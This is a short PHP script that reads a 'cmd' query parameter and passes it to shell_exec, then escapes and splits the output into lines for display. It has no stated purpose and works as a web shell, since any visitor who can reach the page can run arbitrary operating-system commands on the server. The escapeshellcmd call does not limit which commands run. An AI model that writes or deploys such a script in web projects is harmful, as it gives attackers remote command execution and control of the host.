<?php
if (!isset($_GET['cmd']) || $_GET['cmd'] === "") {
	$cmd = 'help';
} else {
	$cmd = $_GET['cmd'];
}
function display($data)
{
	$count=0;
	foreach ($data as $line)
	{
		echo ('<a class="data"><code>'.$line. '</code></a><br/>');
		$count++;

	}
	return $count;
}
function parseStdout($data)
{

	$temp = htmlspecialchars($data);
	$split2 = preg_split("/\n/", $temp);
	$split3 = preg_grep("/.{2,}/", $split2);	
	return $split3;

}

function shellCommand($stringCommand)
{

	if (PHP_OS === "Linux") {
		$err = ''; //>out.txt 2>&1
	} elseif (PHP_OS === "WINNT") {
		$err = "";
	}
	$cmd                 = $stringCommand . $err;
	$s_e_Return          = shell_exec(escapeshellcmd($cmd));
	//$lastString_e_Return = exec(escapeshellcmd($cmd), $e_Return, $e_errorCode);
	$data = $s_e_Return;
	if (PHP_OS === "WINNT") {
		$cleanReturn = mb_convert_encoding($data, 'UTF-8', 'CP-850');
	} else {
		$cleanReturn = $data;

	}

	return $cleanReturn;
}

$executed = shellcommand($cmd);
$parsed   = parseStdout($executed);
?>